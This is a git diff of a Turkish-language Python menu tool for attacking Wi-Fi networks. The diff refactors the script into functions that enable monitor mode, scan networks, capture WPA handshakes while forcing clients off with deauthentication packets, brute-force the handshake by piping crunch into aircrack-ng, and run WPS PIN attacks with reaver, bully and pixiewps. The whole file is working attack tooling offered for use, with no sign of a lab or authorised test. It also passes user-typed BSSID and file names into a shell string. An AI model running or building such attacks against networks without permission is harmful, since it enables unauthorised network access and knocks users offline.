@@ -1,14 +1,139 @@
 import os
+import sys
 import subprocess
-from subprocess import check_call
-print("\ngerekli ögeler indiriliyor")
-print("\n")
-cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
-cmd  = os.system("sleep 3 && clear")
-def intro():
-    cmd  = os.system("clear")
-    print("""
----------------------------------------------------------------------------------------
+import time
+
+def run_cmd(cmd_list, capture_output=False):
+    try:
+        result = subprocess.run(cmd_list, check=True, capture_output=capture_output, text=True)
+        if capture_output:
+            return result.stdout.strip()
+    except subprocess.CalledProcessError as e:
+        print(f"[!] Komut hatası: {' '.join(cmd_list)}")
+        print(e)
+    return None
+
+
+def require_root():
+    if os.geteuid() != 0:
+        print("[!] Bu araç root yetkisi gerektirir. 'sudo' ile tekrar deneyin.")
+        sys.exit(1)
+
+
+def select_interface():
+    print("Mevcut arayüzler:")
+    run_cmd(["iwconfig"])
+    iface = input("Arayüz seçiniz (örn wlan0): ")
+    return iface.strip()
+
+
+def start_monitor():
+    iface = select_interface()
+    run_cmd(["airmon-ng", "check", "kill"])
+    run_cmd(["airmon-ng", "start", iface])
+
+
+def stop_monitor():
+    iface = select_interface()
+    run_cmd(["airmon-ng", "stop", iface])
+
+
+def scan_networks():
+    iface = select_interface()
+    run_cmd(["airodump-ng", iface])
+
+
+def capture_handshake():
+    iface = select_interface()
+    duration = 17 
+    print(f"{duration} saniyelik tarama başlatılıyor...")
+    try:
+        subprocess.run(['airodump-ng', iface, '-M'], timeout=duration)
+        print("Tarama tamamlandı.")
+    except subprocess.TimeoutExpired:
+        print("Tarama süresi doldu, işlem sonlandırıldı.")
+
+    bssid = input("Hedef BSSID giriniz: ")
+    channel = input("Kanal numarası giriniz: ")
+    output = input("Çıktı dosya adı (.cap girişsiz): ")
+
+   
+    deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {iface}"
+    airodump_cmd = f"airodump-ng {iface} --bssid {bssid} -c {channel} -w {output}"
+
+    subprocess.run(['xterm', '-hold', '-e', f"{airodump_cmd} | {deauth_cmd}"])
+
+def brute_force_handshake():
+    essid = input("ESSID giriniz: ")
+    cap_file = input(".cap dosyasının yolu: ")
+    min_len = input("Minimum şifre uzunluğu: ")
+    max_len = input("Maksimum şifre uzunluğu: ")
+
+    charsets = {
+        1: "abcçdefgğhıijklmnoöpqrsştuüvwxyz",
+        2: "ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ",
+        3: "0123456789",
+        4: "!#$%/=?{}[]-*:;",
+        5: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ",
+        6: "abcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789",
+        7: "ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789",
+        8: "!#$%/=?{}[]-*:;0123456789",
+        9: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789",
+       10: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ!#$%/=?{}[]-*:;",
+       11: "abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789!#$%/=?{}[]-*:;"
+    }
+    print("Karakter setleri:")
+    for k, v in charsets.items():
+        print(f"({k}) {v}")
+    choice = int(input("Seçiminiz: "))
+    chars = charsets.get(choice)
+    if not chars:
+        print("Geçersiz seçim.")
+        return
+
+    cmd = ["crunch", min_len, max_len, chars, "-o", "-" ]
+    air_cmd = ["aircrack-ng", "-w", "-", "-e", essid, cap_file]
+    try:
+        p1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True)
+        p2 = subprocess.Popen(air_cmd, stdin=p1.stdout, text=True)
+        p1.stdout.close()
+        p2.communicate()
+    except Exception as e:
+        print(f"[!] Bruteforce hatası: {e}")
+
+
+def scan_wps():
+    iface = select_interface()
+    run_cmd(["airodump-ng", "-M", "--wps", iface])
+
+
+def wps_attack():
+    print("1) Reaver")
+    print("2) Bully")
+    print("3) PixieWPS")
+    print("0) Ana menüye dön")
+    choice = int(input("Saldırı türü seçiniz: "))
+    if choice == 0:
+        return
+    iface = select_interface()
+    bssid = input("BSSID giriniz: ")
+    if choice == 1:
+        run_cmd(["reaver", "-i", iface, "-b", bssid, "-vv"])
+    elif choice == 2:
+        channel = input("Kanal numarası: ")
+        run_cmd(["bully", "-b", bssid, "-c", channel, "--pixiewps", iface])
+    elif choice == 3:
+        run_cmd(["reaver", "-i", iface, "-b", bssid, "-K"])
+    else:
+        print("Geçersiz seçim.")
+
+
+def main():
+    require_root()
+    while True:
+        os.system('clear')
+        print("""
+----------------------------------------------
                __.......__
             .-:::::::::::::-.
           .:::''':::::::''':::.
@@ -26,193 +151,38 @@ def intro():
        .'`-.__ .'`-._.-'`. __.-'`.
      .'       `.         .'       `.
    .'           `-.   .-'           `.
----------------------------------------------------------------------------------------  
-                                                                 |
------------------------------------------------------------------|                                       
-(1)monitör modu baslat                                           |
------------------------------------------------------------------|  
-(2)monitör modu kapat                                            | 
------------------------------------------------------------------|                  
-(3)ağ taramasi                                                   |
------------------------------------------------------------------|
-(4)Handshake yakala(monitör mod gerekli)                         |
------------------------------------------------------------------|   
-(5)handshake bruteforce saldirisi (Handshake,essid gerekli)      |
------------------------------------------------------------------|                                
-(6)Scan for WPS Networks                                         |
------------------------------------------------------------------|
-(7)WPS Networks saldirisi (Bssid,monitör mod gerekli)            |
------------------------------------------------------------------|
-                                                                 |
------------------------------------------------------------------------------------------
-""") 
 
-print("\nburaya secimini gir -->>")
-choice = int(input(""))
-
-if choice == 1:
-    print("interface seciniz -->>")
-    interface = str(input(""))
-    order = "airmon-ng check kill && airmon-ng start {} ".format(interface)
-    geny = os.system(order)
-    intro()
-elif choice == 2:
-    print("interface seciniz -->>")
-    interface = str(input(""))
-    order = "airmon-ng stop {} ".format(interface) 
-    geny = os.system(order)
-    intro()   
-elif choice == 3:
-    print("interface seciniz -->>")
-    interface = str(input(""))  
-    order = "airodump-ng {}".format(interface)
-elif choice == 4:
-  print("interface seciniz -->>")
-  interface = str(input(""))
-  order     = "airodump-ng {} -M".format(interface)
-  print("\nişlem tamamlandiğinda CTRL + C yapin!")
-  cmd = os.system("sleep 7")
-  geny = os.system(order)
-  print("\nhedefin bssid'sini giriniz: ")
-  bssid     = str(input(""))
-  print("\nhedefin kanal numarasini giriniz: ")
-  channel   = int(input())
-  print("cikti dosyasinin adresini giriniz: ")
-  path = str(input(""))
-  order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface, bssid, channel, path, bssid, interface)
-  geny = os.system(order)
-  intro()
-
-elif choice == 5 :
-  print("\nağin essidsini gir -->")
-  essid = str(input(""))
-  print("\nyakalanan handshake'in bulunduğu dosyanin konumunu gir -->")
-  path = str(input(""))
-  print("\nminimum şifre boyutunu gir -->")
-  mini = int(input(""))
-  print("\nmaksimum şifre boyutunu gir -->")
-  maxim  = int(input(""))
-  print("""
----------------------------------------------------------------------------------------
-(1)  küçük harfler                                   (abcçdefgğhıijklmnoöpqrsştuüvwxyz)
-(2)  büyük harfler                                   (ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ)
-(3)  rakamlar                                        (0123456789)
-(4)  özel karakterler                                (!#$%/=?{}[]-*:;)
-(5)  küçük harfler + büyük harfler                   (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ)
-(6)  küçük harfler + rakamlar                        (abcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789)
-(7)  büyük harf + rakamlar                           (ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789)
-(8)  özel karakter + rakamlar                        (!#$%/=?{}[]-*:;0123456789)
-(9)  küçük ve büyük harf + rakamlar                  (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789) 
-(10) küçük ve büyük harf + özel karakterler          (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ!#$%/=?{}[]-*:;)
-(11) küçük ve büyük harf + rakam + özel karakter     (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789!#$%/=?{}[]-*:;)
------------------------------------------------------------------------------------------
+1) Monitor modu başlat
+2) Monitor modu kapat
+3) Ağ taraması
+4) Handshake yakala
+5) Handshake brute-force
+6) WPS ağları tara
+7) WPS saldırısı
+0) Çıkış
+----------------------------------------------
 """)
-  print("\seçiminizi giriniz -->")
-  scm = int(input(""))
-  if scm == 1:
-    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyz")    
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid)
-    geny = os.system(order)
-  elif scm == 2:
-    test = str("ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ")
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 3:
-    test = str("0123456789")
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 4:
-    test = str("!#$%/=?{}[]-*:;")    
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid)
-    geny = os.system(order)
-  elif scm == 5:
-    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ")  
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid)
-    geny = os.system(order)
-  elif scm == 6:
-    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789")   
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 7:
-    test = str("ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789") 
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 8:
-    test = str("!#$%/=?{}[]-*:;0123456789")  
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 9:
-    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789")  
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 10:
-    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ!#$%/=?{}[]-*:;")  
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  elif scm == 11:
-    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789!#$%/=?{}[]-*:;")  
-    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
-    geny = os.system(order)
-  else:
-    print("geçerli bir seçim giriniz") 
-    intro()
-  print("şifreyi kopyalayip tool'u kapatin")
-  cmd5 = os.system("sleep 3d")   
+        choice = int(input("Seçiminizi giriniz: "))
+        if choice == 0:
+            print("Çıkılıyor...")
+            break
+        elif choice == 1:
+            start_monitor()
+        elif choice == 2:
+            stop_monitor()
+        elif choice == 3:
+            scan_networks()
+        elif choice == 4:
+            capture_handshake()
+        elif choice == 5:
+            brute_force_handshake()
+        elif choice == 6:
+            scan_wps()
+        elif choice == 7:
+            wps_attack()
+        else:
+            print("Geçersiz seçim.")
+        input("Devam etmek için Enter'a basın...")
 
-elif choice == 6:
-  print("interface seciniz -->>")
-  interface = str(input(""))
-  order = "airodump-ng -M --wps {}".format(interface)
-  geny = os.system(order)
-  cmd = os.system("sleep 5")
-  intro()
-elif choice == 7:
-  cmd = os.system("clear")
-  print("""
-        
-1)Reaver
-2)Bully
-3)PixieWps
-
-0) ana menüye dön
-""")  
-  
-  print("saldiri türünü seçiniz -->")   
-  attack = int(input(""))                 
-  if attack == 1:
-    print("interface seciniz -->>")
-    interface = str(input(""))  
-    print("ağa ait bssidyi giriniz -->")
-    bssid = str(input(""))
-    order = ("reaver -i {} -b {} -vv").format(interface,bssid)  
-    geny = os.sytem(order)
-    intro()
-  elif attack == 2:
-    print("interface seciniz -->>")
-    interface = str(input(""))  
-    print("ağa ait bssidyi giriniz -->")
-    bssid = str(input(""))
-    print("ağa ait kanal numarasini giriniz -->")
-    chnnl = int(input(""))
-    order = ("bully -b {} -c {} --pixiewps {}").format(bssid,chnnl,interface)  
-    geny = os.system(order)
-    intro()
-  elif attack == 3:
-    print("interface seciniz -->>")
-    interface = str(input(""))  
-    print("ağa ait bssidyi giriniz -->")
-    bssid = str(input(""))
-    order = ("reaver -i {} -b {} -K").format(interface,bssid)
-    geny = os.system(order)
-    intro()
-  elif attack == 0:
-    intro()
-  else:
-    print("---bulunamadi lütfen başa dönün---")
-    cmd = os.system("sleep 2")
-    intro()
-    
-intro()
-    
-    
-    
+if __name__ == "__main__":
+    main()
